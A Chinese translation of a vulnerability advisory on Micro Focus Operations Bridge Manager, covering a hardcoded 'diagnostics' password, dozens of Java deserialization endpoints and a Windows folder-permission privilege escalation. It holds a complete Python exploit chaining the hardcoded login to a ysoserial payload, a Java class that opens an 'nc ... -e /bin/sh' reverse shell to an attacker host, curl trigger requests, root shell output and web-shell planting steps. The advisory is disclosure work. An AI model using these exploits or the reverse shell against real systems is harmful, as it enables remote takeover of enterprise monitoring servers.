> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UkY--znwJ7gqBKKEidauYQ)

从供应商的网站上。

OBM 作为操作桥为您的 IT 操作提供了一个单一的控制中心。所有来自服务器、网络、应用程序、存储和基础设施中其他 IT 孤岛的事件和性能管理数据都会被整合到一个先进的中央事件控制台的单一事件流中。控制台将监控警报显示给相应的操作员团队。

您可以快速识别、监控、故障排除、报告和解决分布式 IT 环境中的问题。这些能力使您有可能改善您所监控环境中的基础设施和服务的性能和可用性，提高您的业务效率和生产力。OBM 可以帮助您在业务服务质量下降之前定位并解决与事件相关的问题。它提供的工具可帮助操作员解决问题，而无需主题专家参与。这就使主题专家能够专注于战略活动。

特别感谢 "零日计划" 处理了这些漏洞对微焦点的披露。

Metasploit 模块正在筹备中，并将很快发送到 Metasploit 框架进行整合。届时将更新本咨询。

总结

Micro Focus Operations Bridge Manager(OBM) 是一个复杂的产品，用于监控和识别 IT 基础设施问题。它与其他企业软件如 Micro Focus Operations Bridge Reporter、Micro Focus Network Node Manager i 等集成。

下图显示了该产品如何集成到复杂的 IT 环境中：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV12oQHay11l64GR1Ospcakd6WiaHd544K0XMwib3p069G8FiaxLbbYdAPylAEPwqYHiclCCpHvsfQSwJA/640?wx_fmt=png)

该产品本身由以下部分组成。

OBM 主应用程序，其中包括一个 Java 管理控制台，运行在 443 端口上。

UCMDB，后台管理系统，运行在 8443 端口。

Postgres 数据库 (默认情况下，可以使用其他数据库)

管理包（默认情况下只安装一个，有几个可用的管理包

其他可选部件，取决于安装类型

组件可以全部安装在一台主机上，也可以单独安装，可以安装在 Windows 和 Linux 操作系统中。

UCMDB 组件的 UI 可以在 8443 端口使用，它似乎是一个独立的产品，集成在 Micro Focus 的几个产品中，当然包括 OBM。

Micro Focus 在其一款产品的文档中描述了它的用途。

Micro Focus Universal CMDB 是一个配置管理数据库，为企业 IT 组织捕捉、记录和存储有关配置项（CI）、服务依赖和支持业务服务的关系的信息。

切开企业的说法，我们可以理解为它是管理 OBM 和其他 Micro Focus 产品配置信息的某种庞杂的数据库。

OBM 需要开放大量的网络端口才能与其他主机进行通信，从它们的安装文档中可以看到，比如 443（主网络应用）和 8443（UCMDB）。这就给 OBM 提供了一个巨大的面向外部的攻击面。

在分析了 OBM 之后，我发现了一个堆积如山的关键安全漏洞，当这些漏洞组合在一起的时候，就会导致应用程序的完全破坏。

使用硬编码凭证

不安全的 Java 反序列化 (不可思议的共 41 个)

使用过时和不安全的 Java 库

默认文件夹权限不正确（导致权限升级到系统）。

所有这些漏洞都会影响最新测试的版本（2020.05）和许多其他版本和产品，下面单独列出。Windows 和 Linux 安装都会受到影响，除了权限升级漏洞，它只影响 Windows。

解释 Java 反序列化，它如何被利用以及它的破坏性有多大，这超出了本咨询的范围。关于它的更多信息，强烈推荐以下链接。

Java Unmarshaller 安全

Foxglove 安全博客文章

漏洞详情

**第 1 条：使用硬编码证书**

CWE-798: 硬编码全权证书的使用

CVE-2020-11854 / ZDI-20-1287

风险分类。危急

攻击向量。远程

限制条件：无 / 不适用

受影响的产品 / 版本。

操作桥管理器版本。2020.05、2019.11、2019.05、2018.11、2018.05、10.6x 和 10.1x 版本及旧版本。

应用性能管理版本。9.51、9.50 和 9.40，配备 uCMDB 10.33 CUP 3。

运营桥（容器化）版本。2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11

OBM 的认证由 UCMDB 组件处理。安装后，会创建以下用户。

admin

sysadmin

UISysadmin

bsm_odb_customer1

diagnostics

这些用户只有在访问 UCMDB 组件时才可见。从主 Web 应用程序中，只有管理员和在主 Web 应用程序中创建的用户是可见的。  

前面三个，admin、sysadmin 和 UISysadmin 的密码都是一样的，这是在安装产品时由管理员设置的。只有 admin 可以登录主 Web 应用，其他的只能登录 UCMDB。

我决定调查剩下的两个账户，即 bsm_odb_customer1 和诊断，因为文档中根本没有提到这两个账户。

虽然没有确定这些账户是如何设置的，但通过大量的测试，确定它们都必须有硬编码的密码。虽然 bsm_odb_customer1 的密码从未被发现，但诊断程序的密码是简单的 "admin"。

这使得任何人都可以以诊断程序的身份登录 UCMDB 组件。需要注意的是，这个用户是无权限的，但正如我们在下面看到的，这并不重要。

为了获得经过认证的 LWSSO_COOKIE_KEY，我们需要向 ucmdb-ui/cms/loginRequest.do 发送一个请求，在查询字符串中包含用户名和密码（后者为 64 基编码）：

```
POST /ucmdb-ui/cms/loginRequest.do;?customerID=1&isEncoded=false&userName=diagnostics&password=YWRtaW4=&ldapServerName=UCMDB HTTP/1.1
```

样本 A：HTTP POST UCMDB 登录请求

UCMDB 服务器将对其作出以下回应：

```
HTTP/1.1 200 OK
Date: Sun, 17 May 2020 21:13:21 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Set-Cookie: LWSSO_COOKIE_KEY=WTQwNdgFlDSM1Il1XTlWJGErjHIGDg54mzv4Yu51_HMk3mrLF7ZMB6KeRecN30sWkdkEFJyLpqUGQ0hXQnPiapbw1891iuGEOW4Ewfk8XNUnIJsouObXN-GaZHLhkfHNlUKp73qEqqvY594n2P5O2sqsn9KYrK7PuGQ5FE0ddKkI2pIvn0rkbT2eRFVdSpHhk-6SadvfLm-CbzdrgLV2INWQgYlYtqMLevI5iv8byN4.; Path=/; HTTPOnly=; Secure=
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Authentication-Result-Key: AUTHENTICATED_SUCCESSFULLY
LOCALE: en
Content-Language: en
Content-Type: text/html;charset=utf-8
Content-Length: 26983

<... POST DATA ...>
```

样本 B：HTTP POST UCMDB 登录响应

...... 其中包含诊断用户的完全认证的 LWSSO_COOKIE_KEY。

Linux 和 Windows 版本的 OBM 都受到这个漏洞的影响。

**2: UCMDB 服务中不安全的 Java 反序列化功能**

CWE-502。不受信任数据的解串联

CVE-2020-11853 / ZDI-20-1288 至 ZDI-20-1325

风险分类。危急

攻击向量。远程

限制条件：需要认证

受影响的产品 / 版本。

操作桥管理器版本。2020.05、2019.11、2019.05、2018.11、2018.05、10.6x 和 10.1x 版本及旧版本。

应用性能管理版本。9.51、9.50 和 9.40，带 uCMDB 10.33 CUP 3。

数据中心自动化 2019.11 版本

运营桥（容器化）版本。2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11

通用 CMDB 版本。2020.05, 2019.11, 2019.05, 2019.02, 2018.11, 2018.08, 2018.05, 11, 10.33, 10.32, 10.31, 10.30

混合云管理 2020.05 版本

服务管理自动化 2020.5 和 2020.02 版本。

UCMDB 组件可以通过以下方式访问。

Java 小程序网页界面

Java 客户端

REST API

在调查 Java 稠密客户端时发现，经过认证后，其几乎所有的通信都是使用 Java 序列化对象完成的。

这意味着，经过认证的攻击者只需将一个恶意的 Java 对象序列化到 POST 体中，注入到其中一个易受攻击的端点，就可以立即实现以 root 或 SYSTEM 的身份进行远程代码执行。

漏洞端点共有 38 个:

```
/ucmdb/services/CmdbOperationExecuterService
/ucmdb/services/CategoryFacadeForGui
/ucmdb/services/CorrelationFacadeForGui
/ucmdb/services/CorrelationRunnerFacade
/ucmdb/services/PackageFacadeForGui
/ucmdb/services/SchedulerFacadeForGui
/ucmdb/services/FoldersFacade
/ucmdb/services/BusinessModelFacadeForGui
/ucmdb/services/WatchServerAPI
/ucmdb/services/TopologyService
/ucmdb/services/ReportService
/ucmdb/services/CMSImagesService
/ucmdb/services/PatternService
/ucmdb/services/FolderService
/ucmdb/services/RelatedCIsService
/ucmdb/services/MailService
/ucmdb/services/DiscoveryService
/ucmdb/services/ServiceDiscoveryService
/ucmdb/services/SoftwareLibraryService
/ucmdb/services/DataAcquisitionService
/ucmdb/services/CIService
/ucmdb/services/HistoryService
/ucmdb/services/BundleService
/ucmdb/services/LocationService
/ucmdb/services/SchedulerService
/ucmdb/services/ImpactService
/ucmdb/services/CommonService
/ucmdb/services/PermissionsService
/ucmdb/services/ClassModelService
/ucmdb/services/SnapshotService
/ucmdb/services/LDAPService
/ucmdb/services/CITService
/ucmdb/services/MultiTenancyService
/ucmdb/services/SecurityService
/ucmdb/services/ResourceManagementService
/ucmdb/services/AutomationMappingService
/ucmdb/services/LicensingService
/ucmdb/services/GenericAdapterService
```

下面可以看到一个对具有讽刺意味的 SecurityService 的请求示例:

```
POST /ucmdb-ui/services/SecurityService HTTP/1.1
Host: 10.10.10.99:8443
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
content-type: application/x-java-serialized-object
Cookie: LWSSO_COOKIE_KEY=1fezNb7T1QRggkhFBrYhMCuiSchrqKdyAabSSOMrZMeP28-FiIyzLNlVV9KBagKsLjiUbGdJ0mWen7OvATgC3LiWmlGRQw5vnTzm9tV8f3tIfOqXvbZIWudk4vajf4Qqux-X2S1MJJB6b2ikNA9M921ilRDptEY0IqeiQ68mxIAFs5PxS9I22r5YszZMSMYme05GgtdbQQA-JqOvDrRNYOFca5IZgtbpGkHzCPUUyLk.
Content-Length: 6855

<JAVA_SERIALIZED_OBJECT>
```

这个 POST 请求，如果用经过验证的 LWSSO_COOKIE_KEY 来完成，如果 <JAVA_SERIALIZED_OBJECT> 是 ysoserial 的有效载荷，那么将导致以 root / SYSTEM 的身份立即执行代码。

为了理解这一点是如何工作的，我们需要更深入地了解一下。上面使用的所有端点都是 Spring Framework 远程服务的实现。这些服务调用由 com.hp.ucmdb.uiserver.services.context.CmdbHttpInvokerServiceExporter 处理，它是一个实现 org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter 的类。Javadoc 中对它有很好的描述:

基于 Servlet-API 的 HTTP 请求处理程序，将指定的服务 Bean 导出为 HTTP invoker 服务端点，通过 HTTP invoker 代理访问。解串化远程调用对象，并序列化远程调用结果对象。像 RMI 一样使用 Java 序列化，但提供了与 Caucho 基于 HTTP 的 Hessian 协议相同的设置简易性。

HTTP invoker 是 Java 对 Java 远程的推荐协议。它比 Hessian 更强大，可扩展性更强，但代价是与 Java 绑定。尽管如此，它和 Hessian 一样容易设置，这是它与 RMI 相比的主要优势。

警告：请注意由于不安全的 Java 反序列化所导致的漏洞。在反序列化步骤中，被操纵的输入流可能导致服务器上不必要的代码执行。因此，不要将 HTTP invoker 端点暴露给不受信任的客户端，而只是在自己的服务之间暴露。一般来说，我们强烈建议使用任何其他的消息格式（例如 JSON）来代替。

在实践中，它以如下方式工作：上面列出的服务（例如 SecurityService）以允许远程方法调用的方式实现。下面的片段包含了 SecurityService 实现的代码（com.hp.ucmdb.uiserver.services.cmdb.impl.SecurityServiceImpl）：

```
public boolean isServerAdministrator() {
    try {
      UcmdbServiceInternal sdk = (UcmdbServiceInternal)ServerContext.get().executeInSessionlessContext(this.sessionContext.getSessionInfo().getCustomerContext(), new SessionlessContextExecutable<UcmdbServiceInternal>() {
            public UcmdbServiceInternal run(SessionContext sessionContext) {
              return sessionContext.getCmdbConnector().getSdk();
            }
          });
      UserId userId = this.sessionContext.getSessionInfo().getLoggedInUserId();
      return sdk.getAuthorizationModelServiceInternal().isServerAdministrator(userId);
    } catch (CmdbException e) {
      LOG.error("User could not be found in URM", (Throwable)e);
      return false;
    } catch (Exception e) {
      LOG.error("Error to get ServerAdministrator from URM", e);
      return false;
    } 
  }
```

C 片段：com.hp.ucmdb.uiserver.services.cmdb.impl.SecurityServiceImpl.isServerAdministrator()

从上面可以看出，这个方法返回的是登录用户是否是管理员。为了使这个方法能够被远程调用，我们必须使用通过 HTTP POST 请求发送序列化的方法调用请求。这些对象默认是 Java 序列化对象，会被前面提到的 HttpInvokerServiceExporter Spring Remoting 类接收，然后传递给实现的服务。

虽然上面所有的端点都实现了不同的功能和服务，但它们都可以用同样的方式进行攻击。上面列出的每个服务类可能有几个或几十个方法，很可能还有更多的（非解串化）漏洞潜伏在那里。

如果将这些漏洞与漏洞 #1 连锁起来，未经认证的攻击者就可以轻松地在 OBM 主机中执行代码。为了达到这个目的，需要采取以下步骤。

用诊断用户认证 UCMDB，如片段 A 和片段 B 所示。

使用所需的命令创建一个 ysoserial CommonsBeanutils1 有效载荷。

将 POST 体中的 payload 连同步骤 1 中获得的 LWSSO_COOKIE_KEY 一起发送到 / ucmdb-ui/services/SecurityService（或上面列出的任何其他服务端点）。

下面的 Python 代码执行了这个链中的所有步骤：

```
#!/usr/bin/python3
#
## Exploit for Micro Focus Operations Bridge Manager 2020.05 UCMDB Services Insecure Java Deserialization (CVE-2020-11853)
## By Pedro Ribeiro (pedrib@agileinfosec.co.uk | @pedrib1337) from Agile Information Security
#
import sys
import os
import requests

def usage():
    print("Usage: ./obmPwn.py <RHOST> <YSOSERIAL_JAR> <COMMAND>")
    exit(1)

if len(sys.argv) < 4:
    usage()

rhost = sys.argv[1]
ysoserial = sys.argv[2]
command = sys.argv[3]

if not os.path.exists(ysoserial):
    usage()

requests.packages.urllib3.disable_warnings()

print("[*] Generating ysoserial payload with command %s" % (command))
os.system("java -jar %s CommonsBeanutils1 '%s' > /tmp/payload.ser" % (ysoserial, command))

url_base = "https://%s:8443/ucmdb-ui" % (rhost)

url_login = url_base + "/cms/loginRequest.do;?customerID=1&isEncoded=false&user
print("[*] Authenticating to %s" % (url_login))
ses = requests.Session()
res = ses.post(url_login, verify=False)

auth = None
for cookie in res.cookies.items():
    if cookie[0] == "LWSSO_COOKIE_KEY":
        auth = cookie

if auth == None:
    print("[-] Failed to authenticate and obtain LWSSO_COOKIE_KEY")
    exit(1)
else:
    print("[+] We are now authenticated and obtained our LWSSO_COOKIE_KEY!")

# SecurityService is used here, but any of the other 37 endpoints can be used
url_pwn = url_base + "/services/SecurityService"
print("[*] Sending ysoserial payload to %s" % (url_pwn))

headers = {'content-type': 'application/x-java-serialized-object'}
with open('/tmp/payload.ser', 'rb') as payload:
    res = ses.post(url_pwn, headers=headers, data=payload, verify=False)
    if res.status_code == 500:
        print("[+] Success, your command has been executed!")
    else:
        print("[-] Something went wrong, please try again...")
```

用以下方式运行利用代码。

python3 ucmdbPwn.py 10.10.10.99 ysoserial-master-SNAPSHOT.jar calc.exe

...... 将导致 calc.exe 在运行 OBM 的 Windows 主机中以 SYSTEM 的形式执行，10.10.10.99：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV12oQHay11l64GR1OspcakdPVk6lBsTp1txcXBIOicf8UTY0slF9QdjaEGRIhLQicIDreibeyRib9icgsQ/640?wx_fmt=png)

Linux 和 Windows 版本的 OBM 都受到这个漏洞的影响。下面的 asciinema cast 显示了 Linux 版本的 OBM 上的漏洞利用情况：

演示视频：https://asciinema.org/a/376442

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV12oQHay11l64GR1Ospcakdzm4kZo3EcsSLfGGsdlU50km1mBYVPNibMrDpwicGUbfWM6h0DBIRo4gg/640?wx_fmt=png)

**3：RegistrationServlet 中不安全的 Java 反序列化**

CWE-502。不受信任数据的解串联

CVE-2020-11853 / ZDI-20-1327

风险分类。危急

攻击向量。远程

限制条件：需要认证

受影响的产品 / 版本。

操作桥管理器版本。2020.05、2019.11、2019.05、2018.11、2018.05、10.6x 和 10.1x 版本及旧版本。

应用性能管理版本。9.51、9.50 和 9.40，带 uCMDB 10.33 CUP 3。

数据中心自动化 2019.11 版本

运营桥（容器化）版本。2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11

通用 CMDB 版本。2020.05, 2019.11, 2019.05, 2019.02, 2018.11, 2018.08, 2018.05, 11, 10.33, 10.32, 10.31, 10.30

混合云管理 2020.05 版本

2020.5 和 2020.02 版本的服务管理自动化。

OBM 在端点 / legacy/topaz/sitescope/conf/registration 处暴露了类 com.hp.opr.legacy.sitescope.servlet.RegistrationServlet。

下面的片段显示了 doPost() 方法的反编译代码：

```
public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
  ObjectInputStream ois = new ObjectInputStream((InputStream)request.getInputStream());
  HashMap<Object, Object> requestMap = null;
  try {
    requestMap = (HashMap<Object, Object>)ois.readObject();
  } catch (ClassNotFoundException e) {
    s_logger.error("Could not get object from request.");
    response.sendError(400, "Could not get object from request.");
    return;
  } 
  if (requestMap == null) {
    s_logger.error("Could not get sample_t from request.");
    response.sendError(400, "Could not get sample_t from request.");
    return;
  } 
  String apiName = request.getParameter("apiName");
  if (apiName == null || apiName.equals("")) {
    s_logger.error("Could not get api_name from request.");
    response.sendError(400, "Could not get api_name from request.");
    return;
  } 
  APIHandler h = APIHandlersDictionary.getHandler(apiName);
  if (h == null) {
    s_logger.error("doPost: dont have handler for api_name ='" + apiName + "'");
    response.sendError(400, "doPost: dont have handler for supplied api_name");
    return;
  } 
  if (s_logger.isDebugEnabled())
    s_logger.debug("doPost: Found handler for api " + apiName + ", invoking it..."); 
  invokeHandler(h, requestMap, response);
  }
```

D 片段：com.hp.pr.legacy.sitescope.servlet.RegistrationServlet.doPost()

从前几行可以看出，这个 servlet 包含了一个经典的，运行中的 Java Deserialization 漏洞。HTTP POST 请求的请求体被变成了一个 ObjectInputStream，然后 readObject() 被调用。

触发这个漏洞是很简单的，只需要向 / legacy/topaz/sitescope/conf/registration 发送一个 POST 请求，请求体带有漏洞。

为了利用它，需要用 c3p0 0.9.1.2 编译 ysoserial。在编译前，应将 Snippet E 中的补丁应用于 ysoserial：

```
diff --git a/pom.xml b/pom.xml
index 73d39c4..9d27473 100644
--- a/pom.xml
+++ b/pom.xml
@@ -239,7 +239,7 @@
                <dependency>
                        <groupId>com.mchange</groupId>
                        <artifactId>c3p0</artifactId>
-                       <version>0.9.5.2</version>
+                       <version>0.9.1.2</version>
                </dependency>
                <dependency>
                        <groupId>javax.servlet</groupId>
```

代码集 E: 为 c3p0 0.9.1.2 编译的 ysoserial 打补丁。

为了在 Windows 中使用 c3p0 ysoserial 有效载荷进行利用，我们需要生成一个 "利用类"：

```
cat  << EOF > ExploitClass.java
public class ExploitClass {
  public ExploitClass() throws Exception {
    Runtime rt = Runtime.getRuntime();
    // for Linux
    String[] commands = {"/bin/sh", "-c", "nc 10.10.10.1 8888 -e /bin/sh"};
    // for Windows
    //String[] commands = {"cmd", "/c", "mspaint.exe"};
    Process pc = rt.exec(commands);
    pc.waitFor();
  }
}
EOF
```

样本 F：ExploitClass 代码

ExploitClass 代码需要用 Java 8 编译：

```
/usr/lib/jvm/java-8-openjdk-amd64/bin/javac ExploitClass.java
```

然后我们启动一个为对象服务的 Python 服务器，以及一个接收反向 shell 的监听器（假设我们攻击的是 Linux 服务器）:

```
python -m SimpleHTTPServer 4444 &
nc -lvknp 8888
```

用我们新行编译的 ysoserial 生成有效载荷:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all-c3p0-0.9.1.2.jar C3P0 "http://10.10.10.1:4444/:ExploitClass" > /tmp/payload.ser
```

```
COOKIE='Cookie: JSESSIONID=xQJJmHDwOQMlAL93PaLPE4PA; LWSSO_COOKIE_KEY=mqx8GAJdW7M8dh5bO99hiZjXAgOHmdteaLsy_c9N77F6n2fFB_XWpe0wDHnpG-x2RbOHNm3H7hjHsmYpRc4PPg2ohEFN7duztvJD0M_u3GUcg_YUJPy5c6ewbqi61FRllh0AoNwAb5K-1fN-uRVK0c8yEVVIkBbxn9vxsCEhofRbZNdtnDQMb3WUeb7yInwRAzfPICWMnE5iuJ_TTyTDlw..;'

curl -i -s -k -X $'POST' \
  -H $'Host: 10.10.10.99' \
  --data-binary @/tmp/payload.ser \
  -H $'Content-Type: application/octet-stream' -H 'Expect:' -H "$COOKIE"  \
   $'https://10.10.10.99/legacy/topaz/sitescope/conf/registration'
```

样本 G：curl 请求触发 Java 反序列化。

这将导致 Python web 服务器收到 ExploitClass 的请求，然后是我们的反向 shell:

```
10.10.10.99 - - [] "GET /ExploitClass.class HTTP/1.1" 200 -
connect to [10.10.10.1] from (UNKNOWN) [10.10.10.99] 55340
whoami
root
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
uname -a
Linux centos7.nat 3.10.0-1062.18.1.el7.x86_64 #1 SMP Tue Mar 17 23:49:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
ls
hpbsmd.pid
libwrapper.so
nannyWrapperRunner.sh
wrapper
wrapper.jar
pwd
/opt/HP/BSM/supervisor/wrapper
```

请注意，这个漏洞只能被登录到主 Web 应用程序的攻击者利用。不幸的是，对于攻击者来说，由于漏洞 #1 中讨论的诊断账户不能用于登录到主 Web 应用程序，因此只有通过其他方式实现身份验证时，该漏洞仍然可以利用。

为了运行 Snippet G 中的漏洞，首先使用有效账户在 443 端口上对主 Web 应用程序进行身份验证，然后在执行 curl 命令之前将 COOKIE 变量改为身份验证后收到的 LWSSO_COOKIE_KEY。

Linux 和 Windows 版本的 OBM 都会受到这个漏洞的影响。

**4：SAMDownloadServlet 中不安全的 Java 反序列化**

CWE-502。不受信任数据的解串联

CVE-2020-11853 / ZDI-20-1328

风险分类。危急

攻击向量。远程

限制条件：需要认证

受影响的产品 / 版本。

操作桥管理器版本。2020.05、2019.11、2019.05、2018.11、2018.05、10.6x 和 10.1x 版本及旧版本。

应用性能管理版本。9.51、9.50 和 9.40，带 uCMDB 10.33 CUP 3。

数据中心自动化 2019.11 版本

运营桥（容器化）版本。2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11

通用 CMDB 版本。2020.05, 2019.11, 2019.05, 2019.02, 2018.11, 2018.08, 2018.05, 11, 10.33, 10.32, 10.31, 10.30

混合云管理 2020.05 版本

2020.5 和 2020.02 版本的服务管理自动化。

另一个存在非常简单的 Java 反序列化漏洞的 servlet 是 com.hp.opr.legacy.sitescope.servlet.SAMDownloadServlet，它暴露在 / legacy/topaz/sitescope/conf/download 处。

doPost() 方法的代码如下所示:

```
public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
  Map<Object, Object> requestMap;
  ObjectInputStream ois = new ObjectInputStream((InputStream)request.getInputStream());
  try {
    requestMap = (Map<Object, Object>)ois.readObject();
  } catch (ClassNotFoundException e) {
    s_logger.error("Could not get object from request.");
    response.sendError(400, "Could not get object from request.");
    return;
  } 
  if (requestMap == null) {
    s_logger.error("Could not get requestMap from request.");
    response.sendError(400, "Could not get requestMap from request.");
    return;
  } 
  if (!validateData(requestMap)) {
    response.sendError(400, "Unable to validate properties from request.");
    return;
  } 
  String xmlValue = handleRequest(requestMap);
  response.setContentType("text/xml; charset=UTF-8");
  PrintWriter writer = response.getWriter();
  writer.write(xmlValue);
  }
```

Snippet H: com.hp.pr.legacy.sitescope.servlet.SAMDownloadServlet.doPost()

漏洞 #3 的限制条件同样适用于这个漏洞。需要进行身份验证，不能使用漏洞 #1 中的硬编码诊断账户，并且需要使用打过补丁的 ysoserial 与 c3p0 0.9.1.2 来进行利用。

这个漏洞的利用方式与前一个漏洞完全相同，唯一需要修改的是 Snippet G 的目标 URL，必须改为 / legacy/topaz/sitescope/conf/download。

Linux 和 Windows 版本的 OBM 都会受到这个漏洞的影响。

**5：RemoteProxyServlet 中不安全的 Java 反序列化问题**

CWE-502。不受信任数据的解串联

未指定 CVE

风险分类。危急

攻击向量。远程

限制条件：无 / 不适用

受影响的产品 / 版本。

Micro Focus Operations Bridge Manager 2020.05 (早期版本可能受影响)

最后一个存在 Java 反序列化漏洞的 servlet 是 com.mercury.util.proxy.servlet.RemoteProxyServlet，它在 / topaz/remoteProxy 和 / topaz/kpiQueryServiceProxy 暴露了两个端点。

该 servlet 的 doPost() 方法部分如下图所示:

```
protected final void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)
      throws ServletException, IOException {
    InvocationInfo invocationInfo = null;
    Method method = null;

    InvocationResult returnedresult;
    try {
      ObjectInputStream objectInputStream = new ObjectInputStream(httpServletRequest.getInputStream());
      invocationInfo = (InvocationInfo) objectInputStream.readObject();
      Object controller = this.getTargetObject(httpServletRequest, invocationInfo);
      validateProxiedObjectState(controller, invocationInfo);
      Object result;
      synchronized (controller) {
        if (controller instanceof RequestSupport) {
          ((RequestSupport) controller).setRequest(httpServletRequest);
        }

        method = controller.getClass().getMethod(invocationInfo.getMethodName(),
            invocationInfo.getParameterTypes());
        result = method.invoke(controller, invocationInfo.getArgs());
      }

      if (ProxyUtils.isStatefulFactory(invocationInfo.getDeclaringClass())) {
        String key = getUniqueSessionID(invocationInfo);
        HttpSession session = httpServletRequest.getSession(true);
        session.setAttribute(key, result);
        result = "Stateful Proxy for " + method.getReturnType().getSimpleName()
            + " was initiated succesfully using the following ProxyStatefulFactory class :"
            + invocationInfo.getDeclaringClass().getSimpleName() + " JSESSIONID=" + session.getId();
      }

      returnedresult = new InvocationResult(result, (Throwable) null);
    } catch (Throwable var12) {
      Throwable e1 = writeToServerLog(var12, method);
      returnedresult = new InvocationResult((Object) null, e1);
    }

    if (_log.isDebugEnabled()) {
      postResponseWithDebug(httpServletResponse, returnedresult, invocationInfo,
          httpServletRequest.getSession().getId());
    } else {
      postResponse(httpServletResponse, returnedresult);
    }
(...)
```

样本一：com.mercury.util.proxy.servlet.RemoteProxyServlet.doPost()

然而，我们又有一个直接的 Java 反序列化漏洞：HTTP POST 请求的主体在没有被检查或修改的情况下被作为一个对象读取。

这个漏洞与之前的漏洞相比，有一个很大的优势 -- 它可以被未经认证的攻击者触发。不幸的是，对于攻击者来说，JBoss 应用服务器的 Java classpath 不包含任何易受攻击的小工具。

可以通过使用 ysoserial 的 URLDNS 小工具来确认该漏洞:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://fakesitethatdoesntexist.com" > /tmp/payload.ser
```

```
curl -i -s -k -X $'POST' \
  -H $'Host: 10.10.10.99' \
  --data-binary @/tmp/payload.ser \
  -H $'Content-Type: application/octet-stream' -H 'Expect:' \
   $'https://10.10.10.99/topaz/kpiQueryServiceProxy'
```

这将导致发送 DNS 查询来解析 "fakesitethatdoesntexist.com"。

虽然 classpath 不包含任何开箱即用的小工具，但有足够时间和耐心的攻击者很可能能够构建一个 Java 小工具链，将这个概念证明转化为未经认证的远程代码执行。

**6：使用过时和不安全的 Java 库**

CWE-1104：使用未维护的第三方组件。

未指定 CVE

风险分类。危急

攻击载体。不适用

限制条件：无 / 不适用

受影响的产品 / 版本。

Micro Focus Operations Bridge Reporter 10.40 (早期版本可能受影响)

如果不是因为在 OBM 中使用了极其过时的 Java 库，#2、#3 和 #4 中列出的漏洞可能更难被利用。这些库中包含的 Java 小工具可以用来实现远程代码执行，就像上面描述的那样。

产品中存在许多过时的、易受攻击的库，但以下库包含了被广泛滥用的 Java 反序列化小工具。

Apache Commons BeanUtils 1.9.3

BeanShell 2.0b4

C3P0 0.9.1.2

如果这些都不存在于 classpath 中，那么要利用漏洞 #2、#3 和 #4 就会难上加难，导致出现像漏洞 #5 中描述的情况（不执行代码的概念验证），并且需要花费更多的精力去利用。

所述的三个库包含的小工具都是开箱即用的，或者只需对 ysoserial 中的有效载荷进行最小的调整，这使得它们非常容易被滥用。

**7: 默认文件夹权限不正确（导致权限升级到 SYSTEM）**

CWE-276: 默认权限不正确

CVE-2020-11858 / ZDI-20-1326

风险分类。危急

攻击载体。本地

限制条件：无 / 不适用

受影响的产品 / 版本。

操作桥管理器版本。2020.05、2019.11、2019.05、2018.11、2018.05、10.6x 和 10.1x 版本及旧版本。

运营桥（容器化）版本。2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11

OBM 默认将自己安装在 C:\HPBSM 中。安装完成后，这个目录及其所有子文件夹都设置了 "特殊权限"。

特殊权限位可以从下面的截图中看到：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV12oQHay11l64GR1OspcakdDOzgwnFGoXjcUH6qAKhqOGw0bQP2lB2iaWB2hMgfyQKo1ORwtpShBWw/640?wx_fmt=png)

如果我们进一步钻研，我们可以看到 "普通"（非管理员）用户的实际权限：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV12oQHay11l64GR1OspcakdqLDRNicMRmYH34UTpn5ooou5D0ggfgBtKuznhBSQnV8h4ImWbzTRDdQ/640?wx_fmt=png)

因此，显然 "普通" 用户可以向 C:\HPBSM 和它的所有子文件夹写入文件。

从这里开始，从 "普通" 用户到 SYSTEM 的权限升级几乎是微不足道的。

以 "普通" 用户（或访客）的身份登录到安装 OBM 的 Windows 系统中去

在 Metasploit 中创建一个 JSP web shell，并启动 exploit/multi/handler 来接收它。

将 web shell 复制到 Tomcat webapps 目录中，并将其重命名为 LB_Verify.jsp(C:\HPBSM\AppServer\webapps\site.war\LB_Verify.jsp)

访问 web 服务器上的 shell 路径 (http://TARGET/topaz/LB_Verify.jsp)

在 Metasploit 中接收 SYSTEM shell，享受吧!

几乎琐碎的部分是由于 shell 的重命名为 LB_Verify.jsp。这是绝对必要的，原因如下。

只有某些路径允许未认证的用户访问（LB_Verify.jsp 就是其中之一）。

作为 Guest / 无权用户，我们可以直接写入文件，但不能删除或修改任何现有文件，幸运的是 LB_Verify.jsp 并不存在。

点击这里查看视频，可以看到完整的操作链。

需要注意的是，Micro Focus 的 Hardening 文档规定，这些权限应该在安装后更改。

OBM 安装目录。将 OBM 安装目录的访问权限限制为特权用户。我们建议只允许 SYSTEM 账户和 Administrators 组访问这个目录。

然而这就引出了一个问题 -- 为什么在产品安装完成后不做？此外，文档还存在误导性：它应该说安装文件夹和所有子文件夹不应该被管理员访问。

虽然这一点是有记录的，但它仍然是一个严重的漏洞，如果没有理由设置这些权限，那么它们应该由安装程序自动解除设置。

